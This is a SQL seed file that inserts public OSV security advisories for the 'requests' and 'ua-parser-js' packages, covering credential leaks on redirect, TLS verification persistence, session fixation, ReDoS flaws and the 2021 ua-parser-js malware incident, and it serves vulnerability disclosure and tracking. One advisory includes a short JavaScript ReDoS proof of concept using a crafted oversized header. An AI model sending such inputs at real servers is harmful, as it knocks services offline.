INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-9wx4-h78v-vm56', 'OSV', 'requests', 'pypi', 'Requests `Session` object does not verify requests after making first request with verify=False', 'When using a `requests.Session`, if the first request to a given origin is made with `verify=False`, TLS certificate verification may remain disabled for all subsequent requests to that origin, even if `verify=True` is explicitly specified later.

This occurs because the underlying connection is reused from the session''s connection pool, causing the initial TLS verification setting to persist for the lifetime of the pooled connection. As a result, applications may unintentionally send requests without certificate verification, leading to potential man-in-the-middle attacks and compromised confidentiality or integrity.

This behavior affects versions of `requests` prior to 2.32.0.', '["0.0.1", "0.10.0", "0.10.1", "0.10.2", "0.10.3", "0.10.4", "0.10.6", "0.10.7", "0.10.8", "0.11.1", "0.11.2", "0.12.0", "0.12.01", "0.12.1", "0.13.0", "0.13.1", "0.13.2", "0.13.3", "0.13.4", "0.13.5", "0.13.6", "0.13.7", "0.13.8", "0.13.9", "0.14.0", "0.14.1", "0.14.2", "0.2.0", "0.2.1", "0.2.2", "0.2.3", "0.2.4", "0.3.0", "0.3.1", "0.3.2", "0.3.3", "0.3.4", "0.4.0", "0.4.1", "0.5.0", "0.5.1", "0.6.0", "0.6.1", "0.6.2", "0.6.3", "0.6.4", "0.6.5", "0.6.6", "0.7.0", "0.7.1", "0.7.2", "0.7.3", "0.7.4", "0.7.5", "0.7.6", "0.8.0", "0.8.1", "0.8.2", "0.8.3", "0.8.4", "0.8.5", "0.8.6", "0.8.7", "0.8.8", "0.8.9", "0.9.0", "0.9.1", "0.9.2", "0.9.3", "1.0.0", "1.0.1", "1.0.2", "1.0.3", "1.0.4", "1.1.0", "1.2.0", "1.2.1", "1.2.2", "1.2.3", "2.0.0", "2.0.1", "2.1.0", "2.10.0", "2.11.0", "2.11.1", "2.12.0", "2.12.1", "2.12.2", "2.12.3", "2.12.4", "2.12.5", "2.13.0", "2.14.0", "2.14.1", "2.14.2", "2.15.0", "2.15.1", "2.16.0", "2.16.1", "2.16.2", "2.16.3", "2.16.4", "2.16.5", "2.17.0", "2.17.1", "2.17.2", "2.17.3", "2.18.0", "2.18.1", "2.18.2", "2.18.3", "2.18.4", "2.19.0", "2.19.1", "2.2.0", "2.2.1", "2.20.0", "2.20.1", "2.21.0", "2.22.0", "2.23.0", "2.24.0", "2.25.0", "2.25.1", "2.26.0", "2.27.0", "2.27.1", "2.28.0", "2.28.1", "2.28.2", "2.29.0", "2.3.0", "2.30.0", "2.31.0", "2.4.0", "2.4.1", "2.4.2", "2.4.3", "2.5.0", "2.5.1", "2.5.2", "2.5.3", "2.6.0", "2.6.1", "2.6.2", "2.7.0", "2.8.0", "2.8.1", "2.9.0", "2.9.1", "2.9.2"]'::jsonb, '0.0', '2024-05-20 20:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-cfj3-7x9c-4p3h', 'OSV', 'requests', 'pypi', 'Exposure of Sensitive Information to an Unauthorized Actor in Requests', 'Requests (aka python-requests) before 2.3.0 allows remote servers to obtain a netrc password by reading the Authorization header in a redirected request.', '["0.0.1", "0.10.0", "0.10.1", "0.10.2", "0.10.3", "0.10.4", "0.10.6", "0.10.7", "0.10.8", "0.11.1", "0.11.2", "0.12.0", "0.12.01", "0.12.1", "0.13.0", "0.13.1", "0.13.2", "0.13.3", "0.13.4", "0.13.5", "0.13.6", "0.13.7", "0.13.8", "0.13.9", "0.14.0", "0.14.1", "0.14.2", "0.2.0", "0.2.1", "0.2.2", "0.2.3", "0.2.4", "0.3.0", "0.3.1", "0.3.2", "0.3.3", "0.3.4", "0.4.0", "0.4.1", "0.5.0", "0.5.1", "0.6.0", "0.6.1", "0.6.2", "0.6.3", "0.6.4", "0.6.5", "0.6.6", "0.7.0", "0.7.1", "0.7.2", "0.7.3", "0.7.4", "0.7.5", "0.7.6", "0.8.0", "0.8.1", "0.8.2", "0.8.3", "0.8.4", "0.8.5", "0.8.6", "0.8.7", "0.8.8", "0.8.9", "0.9.0", "0.9.1", "0.9.2", "0.9.3", "1.0.0", "1.0.1", "1.0.2", "1.0.3", "1.0.4", "1.1.0", "1.2.0", "1.2.1", "1.2.2", "1.2.3", "2.0.0", "2.0.1", "2.1.0", "2.2.0", "2.2.1"]'::jsonb, '0.0', '2022-05-17 03:49:35+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-gc5v-m9x4-r6x2', 'OSV', 'requests', 'pypi', 'Requests has Insecure Temp File Reuse in its extract_zipped_paths() utility function', '### Impact
The `requests.utils.extract_zipped_paths()` utility function uses a predictable filename when extracting files from zip archives into the system temporary directory. If the target file already exists, it is reused without validation. A local attacker with write access to the temp directory could pre-create a malicious file that would be loaded in place of the legitimate one.

### Affected usages
**Standard usage of the Requests library is not affected by this vulnerability.** Only applications that call `extract_zipped_paths()` directly are impacted.

### Remediation
Upgrade to at least Requests 2.33.0, where the library now extracts files to a non-deterministic location.

If developers are unable to upgrade, they can set `TMPDIR` in their environment to a directory with restricted write access.', '["0.0.1", "0.10.0", "0.10.1", "0.10.2", "0.10.3", "0.10.4", "0.10.6", "0.10.7", "0.10.8", "0.11.1", "0.11.2", "0.12.0", "0.12.01", "0.12.1", "0.13.0", "0.13.1", "0.13.2", "0.13.3", "0.13.4", "0.13.5", "0.13.6", "0.13.7", "0.13.8", "0.13.9", "0.14.0", "0.14.1", "0.14.2", "0.2.0", "0.2.1", "0.2.2", "0.2.3", "0.2.4", "0.3.0", "0.3.1", "0.3.2", "0.3.3", "0.3.4", "0.4.0", "0.4.1", "0.5.0", "0.5.1", "0.6.0", "0.6.1", "0.6.2", "0.6.3", "0.6.4", "0.6.5", "0.6.6", "0.7.0", "0.7.1", "0.7.2", "0.7.3", "0.7.4", "0.7.5", "0.7.6", "0.8.0", "0.8.1", "0.8.2", "0.8.3", "0.8.4", "0.8.5", "0.8.6", "0.8.7", "0.8.8", "0.8.9", "0.9.0", "0.9.1", "0.9.2", "0.9.3", "1.0.0", "1.0.1", "1.0.2", "1.0.3", "1.0.4", "1.1.0", "1.2.0", "1.2.1", "1.2.2", "1.2.3", "2.0.0", "2.0.1", "2.1.0", "2.10.0", "2.11.0", "2.11.1", "2.12.0", "2.12.1", "2.12.2", "2.12.3", "2.12.4", "2.12.5", "2.13.0", "2.14.0", "2.14.1", "2.14.2", "2.15.0", "2.15.1", "2.16.0", "2.16.1", "2.16.2", "2.16.3", "2.16.4", "2.16.5", "2.17.0", "2.17.1", "2.17.2", "2.17.3", "2.18.0", "2.18.1", "2.18.2", "2.18.3", "2.18.4", "2.19.0", "2.19.1", "2.2.0", "2.2.1", "2.20.0", "2.20.1", "2.21.0", "2.22.0", "2.23.0", "2.24.0", "2.25.0", "2.25.1", "2.26.0", "2.27.0", "2.27.1", "2.28.0", "2.28.1", "2.28.2", "2.29.0", "2.3.0", "2.30.0", "2.31.0", "2.32.0", "2.32.1", "2.32.2", "2.32.3", "2.32.4", "2.32.5", "2.4.0", "2.4.1", "2.4.2", "2.4.3", "2.5.0", "2.5.1", "2.5.2", "2.5.3", "2.6.0", "2.6.1", "2.6.2", "2.7.0", "2.8.0", "2.8.1", "2.9.0", "2.9.1", "2.9.2"]'::jsonb, '0.0', '2026-03-25 16:56:28+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-j8r2-6x86-q33q', 'OSV', 'requests', 'pypi', 'Unintended leak of Proxy-Authorization header in requests', '### Impact

Since Requests v2.3.0, Requests has been vulnerable to potentially leaking `Proxy-Authorization` headers to destination servers, specifically during redirects to an HTTPS origin. This is a product of how `rebuild_proxies` is used to recompute and [reattach the `Proxy-Authorization` header](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/sessions.py#L319-L328) to requests when redirected. Note this behavior has _only_ been observed to affect proxied requests when credentials are supplied in the URL user information component (e.g. `https://username:password@proxy:8080`).

**Current vulnerable behavior(s):**

1. HTTP → HTTPS: **leak**
2. HTTPS → HTTP: **no leak**
3. HTTPS → HTTPS: **leak**
4. HTTP → HTTP: **no leak**

For HTTP connections sent through the proxy, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into further tunneled requests. This results in Requests forwarding the header to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate those credentials.

The reason this currently works for HTTPS connections in Requests is the `Proxy-Authorization` header is also handled by urllib3 with our usage of the ProxyManager in adapters.py with [`proxy_manager_for`](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/adapters.py#L199-L235). This will compute the required proxy headers in `proxy_headers` and pass them to the Proxy Manager, avoiding attaching them directly to the Request object. This will be our preferred option going forward for default usage.

### Patches
Starting in Requests v2.31.0, Requests will no longer attach this header to redirects with an HTTPS destination. This should have no negative impacts on the default behavior of the library as the proxy credentials are already properly being handled by urllib3''s ProxyManager.

For users with custom adapters, this _may_ be potentially breaking if you were already working around this behavior. The previous functionality of `rebuild_proxies` doesn''t make sense in any case, so we would encourage any users impacted to migrate any handling of Proxy-Authorization directly into their custom adapter.

### Workarounds
For users who are not able to update Requests immediately, there is one potential workaround.

You may disable redirects by setting `allow_redirects` to `False` on all calls through Requests top-level APIs. Note that if you''re currently relying on redirect behaviors, you will need to capture the 3xx response codes and ensure a new request is made to the redirect destination.
```
import requests
r = requests.get(''http://github.com/'', allow_redirects=False)
```

### Credits

This vulnerability was discovered and disclosed by the following individuals.

Dennis Brinkrolf, Haxolot (https://haxolot.com/)
Tobias Funke, (tobiasfunke93@gmail.com)', '["2.10.0", "2.11.0", "2.11.1", "2.12.0", "2.12.1", "2.12.2", "2.12.3", "2.12.4", "2.12.5", "2.13.0", "2.14.0", "2.14.1", "2.14.2", "2.15.0", "2.15.1", "2.16.0", "2.16.1", "2.16.2", "2.16.3", "2.16.4", "2.16.5", "2.17.0", "2.17.1", "2.17.2", "2.17.3", "2.18.0", "2.18.1", "2.18.2", "2.18.3", "2.18.4", "2.19.0", "2.19.1", "2.20.0", "2.20.1", "2.21.0", "2.22.0", "2.23.0", "2.24.0", "2.25.0", "2.25.1", "2.26.0", "2.27.0", "2.27.1", "2.28.0", "2.28.1", "2.28.2", "2.29.0", "2.3.0", "2.30.0", "2.4.0", "2.4.1", "2.4.2", "2.4.3", "2.5.0", "2.5.1", "2.5.2", "2.5.3", "2.6.0", "2.6.1", "2.6.2", "2.7.0", "2.8.0", "2.8.1", "2.9.0", "2.9.1", "2.9.2"]'::jsonb, '0.0', '2023-05-22 20:36:32+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-pg2w-x9wp-vw92', 'OSV', 'requests', 'pypi', 'Python Requests Session Fixation', 'The `resolve_redirects` function in sessions.py in requests 2.1.0 through 2.5.3 allows remote attackers to conduct session fixation attacks via a cookie without a host value in a redirect.', '["2.1.0", "2.2.0", "2.2.1", "2.3.0", "2.4.0", "2.4.1", "2.4.2", "2.4.3", "2.5.0", "2.5.1", "2.5.2", "2.5.3"]'::jsonb, '0.0', '2022-05-13 01:11:23+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-x84v-xcm2-53pg', 'OSV', 'requests', 'pypi', 'Insufficiently Protected Credentials in Requests', 'The Requests package through 2.19.1 before 2018-09-14 for Python sends an HTTP Authorization header to an http URI upon receiving a same-hostname https-to-http redirect, which makes it easier for remote attackers to discover credentials by sniffing the network.', '["0.0.1", "0.10.0", "0.10.1", "0.10.2", "0.10.3", "0.10.4", "0.10.6", "0.10.7", "0.10.8", "0.11.1", "0.11.2", "0.12.0", "0.12.01", "0.12.1", "0.13.0", "0.13.1", "0.13.2", "0.13.3", "0.13.4", "0.13.5", "0.13.6", "0.13.7", "0.13.8", "0.13.9", "0.14.0", "0.14.1", "0.14.2", "0.2.0", "0.2.1", "0.2.2", "0.2.3", "0.2.4", "0.3.0", "0.3.1", "0.3.2", "0.3.3", "0.3.4", "0.4.0", "0.4.1", "0.5.0", "0.5.1", "0.6.0", "0.6.1", "0.6.2", "0.6.3", "0.6.4", "0.6.5", "0.6.6", "0.7.0", "0.7.1", "0.7.2", "0.7.3", "0.7.4", "0.7.5", "0.7.6", "0.8.0", "0.8.1", "0.8.2", "0.8.3", "0.8.4", "0.8.5", "0.8.6", "0.8.7", "0.8.8", "0.8.9", "0.9.0", "0.9.1", "0.9.2", "0.9.3", "1.0.0", "1.0.1", "1.0.2", "1.0.3", "1.0.4", "1.1.0", "1.2.0", "1.2.1", "1.2.2", "1.2.3", "2.0.0", "2.0.1", "2.1.0", "2.10.0", "2.11.0", "2.11.1", "2.12.0", "2.12.1", "2.12.2", "2.12.3", "2.12.4", "2.12.5", "2.13.0", "2.14.0", "2.14.1", "2.14.2", "2.15.0", "2.15.1", "2.16.0", "2.16.1", "2.16.2", "2.16.3", "2.16.4", "2.16.5", "2.17.0", "2.17.1", "2.17.2", "2.17.3", "2.18.0", "2.18.1", "2.18.2", "2.18.3", "2.18.4", "2.19.0", "2.19.1", "2.2.0", "2.2.1", "2.3.0", "2.4.0", "2.4.1", "2.4.2", "2.4.3", "2.5.0", "2.5.1", "2.5.2", "2.5.3", "2.6.0", "2.6.1", "2.6.2", "2.7.0", "2.8.0", "2.8.1", "2.9.0", "2.9.1", "2.9.2"]'::jsonb, '0.0', '2018-10-29 19:06:46+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2014-13', 'OSV', 'requests', 'pypi', '', 'Requests (aka python-requests) before 2.3.0 allows remote servers to obtain a netrc password by reading the Authorization header in a redirected request.', '["0.0.1", "0.10.0", "0.10.1", "0.10.2", "0.10.3", "0.10.4", "0.10.6", "0.10.7", "0.10.8", "0.11.1", "0.11.2", "0.12.0", "0.12.01", "0.12.1", "0.13.0", "0.13.1", "0.13.2", "0.13.3", "0.13.4", "0.13.5", "0.13.6", "0.13.7", "0.13.8", "0.13.9", "0.14.0", "0.14.1", "0.14.2", "0.2.0", "0.2.1", "0.2.2", "0.2.3", "0.2.4", "0.3.0", "0.3.1", "0.3.2", "0.3.3", "0.3.4", "0.4.0", "0.4.1", "0.5.0", "0.5.1", "0.6.0", "0.6.1", "0.6.2", "0.6.3", "0.6.4", "0.6.5", "0.6.6", "0.7.0", "0.7.1", "0.7.2", "0.7.3", "0.7.4", "0.7.5", "0.7.6", "0.8.0", "0.8.1", "0.8.2", "0.8.3", "0.8.4", "0.8.5", "0.8.6", "0.8.7", "0.8.8", "0.8.9", "0.9.0", "0.9.1", "0.9.2", "0.9.3", "1.0.0", "1.0.1", "1.0.2", "1.0.3", "1.0.4", "1.1.0", "1.2.0", "1.2.1", "1.2.2", "1.2.3", "2.0.0", "2.0.1", "2.1.0", "2.2.0", "2.2.1"]'::jsonb, '0.0', '2014-10-15 14:55:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2014-14', 'OSV', 'requests', 'pypi', '', 'Requests (aka python-requests) before 2.3.0 allows remote servers to obtain sensitive information by reading the Proxy-Authorization header in a redirected request.', '["0.0.1", "0.10.0", "0.10.1", "0.10.2", "0.10.3", "0.10.4", "0.10.6", "0.10.7", "0.10.8", "0.11.1", "0.11.2", "0.12.0", "0.12.01", "0.12.1", "0.13.0", "0.13.1", "0.13.2", "0.13.3", "0.13.4", "0.13.5", "0.13.6", "0.13.7", "0.13.8", "0.13.9", "0.14.0", "0.14.1", "0.14.2", "0.2.0", "0.2.1", "0.2.2", "0.2.3", "0.2.4", "0.3.0", "0.3.1", "0.3.2", "0.3.3", "0.3.4", "0.4.0", "0.4.1", "0.5.0", "0.5.1", "0.6.0", "0.6.1", "0.6.2", "0.6.3", "0.6.4", "0.6.5", "0.6.6", "0.7.0", "0.7.1", "0.7.2", "0.7.3", "0.7.4", "0.7.5", "0.7.6", "0.8.0", "0.8.1", "0.8.2", "0.8.3", "0.8.4", "0.8.5", "0.8.6", "0.8.7", "0.8.8", "0.8.9", "0.9.0", "0.9.1", "0.9.2", "0.9.3", "1.0.0", "1.0.1", "1.0.2", "1.0.3", "1.0.4", "1.1.0", "1.2.0", "1.2.1", "1.2.2", "1.2.3", "2.0.0", "2.0.1", "2.1.0", "2.2.0", "2.2.1"]'::jsonb, '0.0', '2014-10-15 14:55:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2015-17', 'OSV', 'requests', 'pypi', '', 'The resolve_redirects function in sessions.py in requests 2.1.0 through 2.5.3 allows remote attackers to conduct session fixation attacks via a cookie without a host value in a redirect.', '["2.1.0", "2.2.0", "2.2.1", "2.3.0", "2.4.0", "2.4.1", "2.4.2", "2.4.3", "2.5.0", "2.5.1", "2.5.2", "2.5.3", "v2.5.2", "v2.5.1", "v2.5.0", "v2.4.3", "v2.4.2", "v2.4.1", "v2.4.0", "v2.3.0", "v2.2.1", "v2.2.0", "v2.1.0", "v2.0.1", "v2.0.0", "v2.0", "2.0", "v1.2.3", "v1.2.2", "v1.2.1", "v1.2.0", "v1.1.0", "v1.0.4", "v1.0.3", "v1.0.2", "v1.0.1", "v1.0.0", "v0.14.2", "v0.14.0", "v0.14.1", "v0.13.9", "v0.13.7", "v0.13.6", "v0.13.5", "v0.13.4", "v0.13.3", "v0.13.2", "v0.13.1", "v0.13.0", "v0.12.1", "v0.12.0", "v0.11.1", "v0.10.8", "v0.10.7", "v0.10.6", "v0.10.5", "v0.10.4", "v0.10.3", "v0.10.2", "v0.10.1", "v0.10.0", "v0.9.3", "v0.9.1", "v0.9.0", "v0.8.9", "v0.8.8", "v0.6.4", "v0.6.3", "v0.5.1", "v0.5.0", "v0.4.1", "v0.4.0", "v0.3.4", "v0.3.3", "v0.3.2", "v0.3.0", "v0.2.4", "v0.2.3", "v0.2.2", "v0.2.1", "v0.2.0"]'::jsonb, '0.0', '2015-03-18 16:59:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2018-28', 'OSV', 'requests', 'pypi', '', 'The Requests package before 2.20.0 for Python sends an HTTP Authorization header to an http URI upon receiving a same-hostname https-to-http redirect, which makes it easier for remote attackers to discover credentials by sniffing the network.', '["0.0.1", "0.10.0", "0.10.1", "0.10.2", "0.10.3", "0.10.4", "0.10.6", "0.10.7", "0.10.8", "0.11.1", "0.11.2", "0.12.0", "0.12.01", "0.12.1", "0.13.0", "0.13.1", "0.13.2", "0.13.3", "0.13.4", "0.13.5", "0.13.6", "0.13.7", "0.13.8", "0.13.9", "0.14.0", "0.14.1", "0.14.2", "0.2.0", "0.2.1", "0.2.2", "0.2.3", "0.2.4", "0.3.0", "0.3.1", "0.3.2", "0.3.3", "0.3.4", "0.4.0", "0.4.1", "0.5.0", "0.5.1", "0.6.0", "0.6.1", "0.6.2", "0.6.3", "0.6.4", "0.6.5", "0.6.6", "0.7.0", "0.7.1", "0.7.2", "0.7.3", "0.7.4", "0.7.5", "0.7.6", "0.8.0", "0.8.1", "0.8.2", "0.8.3", "0.8.4", "0.8.5", "0.8.6", "0.8.7", "0.8.8", "0.8.9", "0.9.0", "0.9.1", "0.9.2", "0.9.3", "1.0.0", "1.0.1", "1.0.2", "1.0.3", "1.0.4", "1.1.0", "1.2.0", "1.2.1", "1.2.2", "1.2.3", "2.0.0", "2.0.1", "2.1.0", "2.10.0", "2.11.0", "2.11.1", "2.12.0", "2.12.1", "2.12.2", "2.12.3", "2.12.4", "2.12.5", "2.13.0", "2.14.0", "2.14.1", "2.14.2", "2.15.0", "2.15.1", "2.16.0", "2.16.1", "2.16.2", "2.16.3", "2.16.4", "2.16.5", "2.17.0", "2.17.1", "2.17.2", "2.17.3", "2.18.0", "2.18.1", "2.18.2", "2.18.3", "2.18.4", "2.19.0", "2.19.1", "2.2.0", "2.2.1", "2.3.0", "2.4.0", "2.4.1", "2.4.2", "2.4.3", "2.5.0", "2.5.1", "2.5.2", "2.5.3", "2.6.0", "2.6.1", "2.6.2", "2.7.0", "2.8.0", "2.8.1", "2.9.0", "2.9.1", "2.9.2"]'::jsonb, '0.0', '2018-10-09 17:29:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2023-74', 'OSV', 'requests', 'pypi', '', 'Requests is a HTTP library. Since Requests 2.3.0, Requests has been leaking Proxy-Authorization headers to destination servers when redirected to an HTTPS endpoint. This is a product of how we use `rebuild_proxies` to reattach the `Proxy-Authorization` header to requests. For HTTP connections sent through the tunnel, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into the tunneled request. This results in Requests forwarding proxy credentials to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate sensitive information. This issue has been patched in version 2.31.0.

', '["2.10.0", "2.11.0", "2.11.1", "2.12.0", "2.12.1", "2.12.2", "2.12.3", "2.12.4", "2.12.5", "2.13.0", "2.14.0", "2.14.1", "2.14.2", "2.15.0", "2.15.1", "2.16.0", "2.16.1", "2.16.2", "2.16.3", "2.16.4", "2.16.5", "2.17.0", "2.17.1", "2.17.2", "2.17.3", "2.18.0", "2.18.1", "2.18.2", "2.18.3", "2.18.4", "2.19.0", "2.19.1", "2.20.0", "2.20.1", "2.21.0", "2.22.0", "2.23.0", "2.24.0", "2.25.0", "2.25.1", "2.26.0", "2.27.0", "2.27.1", "2.28.0", "2.28.1", "2.28.2", "2.29.0", "2.3.0", "2.30.0", "2.4.0", "2.4.1", "2.4.2", "2.4.3", "2.5.0", "2.5.1", "2.5.2", "2.5.3", "2.6.0", "2.6.1", "2.6.2", "2.7.0", "2.8.0", "2.8.1", "2.9.0", "2.9.1", "2.9.2"]'::jsonb, '0.0', '2023-05-26 18:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-236c-vhj4-gfxg', 'OSV', 'ua-parser-js', 'npm', 'Duplicate Advisory: Embedded malware in ua-parser-js', '### Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-pjwm-rvh2-c87w. This link is maintained to preserve external references.

### Original Description
A vulnerability was found in ua-parser-js 0.7.29/0.8.0/1.0.0. It has been rated as critical. This issue affects the crypto mining component which introduces a backdoor. Upgrading to version 0.7.30, 0.8.1 and 1.0.1 is able to address this issue. It is recommended to upgrade the affected component.', '["1.0.0"]'::jsonb, '0.0', '2022-05-25 00:00:31+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-394c-5j6w-4xmx', 'OSV', 'ua-parser-js', 'npm', 'ua-parser-js Regular Expression Denial of Service vulnerability', 'The package ua-parser-js before 0.7.23 are vulnerable to Regular Expression Denial of Service (ReDoS) in multiple regexes (see linked commit for more info).', '[]'::jsonb, '0.0', '2022-02-09 22:46:53+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-662x-fhqg-9p8v', 'OSV', 'ua-parser-js', 'npm', 'Regular Expression Denial of Service in ua-parser-js', 'The package ua-parser-js before 0.7.22 are vulnerable to Regular Expression Denial of Service (ReDoS) via the regex for Redmi Phones and Mi Pad Tablets UA.', '[]'::jsonb, '0.0', '2021-05-07 16:18:19+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-78cj-fxph-m83p', 'OSV', 'ua-parser-js', 'npm', 'Regular Expression Denial of Service (ReDoS) in ua-parser-js', 'ua-parser-js >= 0.7.14, fixed in 0.7.24, uses a regular expression which is vulnerable to denial of service. If an attacker sends a malicious User-Agent header, ua-parser-js will get stuck processing it for an extended period of time.', '[]'::jsonb, '0.0', '2021-05-06 16:11:13+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-9h5v-pfqq-x599', 'OSV', 'ua-parser-js', 'npm', 'UAParser.js: Unbounded `Sec-CH-UA-Model` parsing can trigger ReDoS in `withClientHints()`', E'### Summary

A regular expression denial-of-service (ReDoS) vulnerability has been discovered in `ua-parser-js` when using the Client Hints API. By sending a crafted `Sec-CH-UA-Model` header to an application that calls `UAParser(headers).withClientHints()`, an attacker can cause the parser to spend excessive CPU time due to catastrophic backtracking in the device [regex](https://github.com/faisalman/ua-parser-js/blob/2.0.9/src/main/ua-parser.js#L615):

```js
/ ([\\w ]+) miui\\/v?\\d/i
```

Unlike when using the `User-Agent` value, which has a hard limit of `UA_MAX_LENGTH = 500`, when using Client Hints, values are copied without a length limit before being passed into regex parsing.

### PoC

```js
const { UAParser } = require(''ua-parser-js'');

const headers = {
  ''sec-ch-ua-platform'': ''"Android"'',
  ''sec-ch-ua-mobile'': ''?1'',
  ''sec-ch-ua-model'': ''"'' + ''A ''.repeat(25000) + ''"''
};

const t0 = process.hrtime.bigint();
UAParser(headers).withClientHints();
const ms = Number(process.hrtime.bigint() - t0) / 1e6;

if (ms > 100) {
  console.log(''Potential ReDoS'');
}
```

### Impact

This vulnerability allows an unauthenticated attacker to trigger a denial-of-service condition in any __server-side__ application that uses `UAParser(headers).withClientHints()`. A single request with a ~32,000-character model value can consume over 400ms of CPU time, with parsing time growing polynomially with input length. The impact is __availability__ only, there is no confidentiality or integrity impact.

### Affected Versions

`ua-parser-js` versions `>=2.0.1, <=2.0.9` are affected. The `withClientHints()` API is not present in version `0.7.x` or `1.x`.

### Patches

A patch has been released to fix the vulnerable regular expression and limit the Client Hints input. Users should update to version `2.0.10` or later.

### References

- [Regular expression Denial of Service - ReDoS (OWASP)](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)

### Credits

Thanks to [@sondt99](https://github.com/sondt99), who first reported the issue.', '[]'::jsonb, '0.0', '2026-06-15 20:15:02+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-fhg7-m89q-25r3', 'OSV', 'ua-parser-js', 'npm', 'ReDoS Vulnerability in ua-parser-js version', '### Description:
A regular expression denial of service (ReDoS) vulnerability has been discovered in `ua-parser-js`.

### Impact:
This vulnerability bypass the library''s `MAX_LENGTH` input limit prevention. By crafting a very-very-long user-agent string with specific pattern, an attacker can turn the script to get stuck processing for a very long time which results in a denial of service (DoS) condition.

### Affected Versions:
From version `0.7.30` to before versions `0.7.33` / `1.0.33`.

### Patches:
A patch has been released to remove the vulnerable regular expression, update to version `0.7.33` / `1.0.33` or later.

### References:
[Regular expression Denial of Service - ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)

### Credits:
Thanks to @Snyk who first reported the issue.', '[]'::jsonb, '0.0', '2023-01-24 15:36:32+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-pjwm-rvh2-c87w', 'OSV', 'ua-parser-js', 'npm', 'Embedded malware in ua-parser-js', 'The npm package `ua-parser-js` had three versions published with malicious code. Users of affected versions (0.7.29, 0.8.0, 1.0.0) should upgrade as soon as possible and check their systems for suspicious activity. See [this issue](https://github.com/faisalman/ua-parser-js/issues/536) for details as they unfold.

Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.', '["1.0.0"]'::jsonb, '0.0', '2021-10-22 20:38:14+00') ON CONFLICT (id) DO NOTHING;
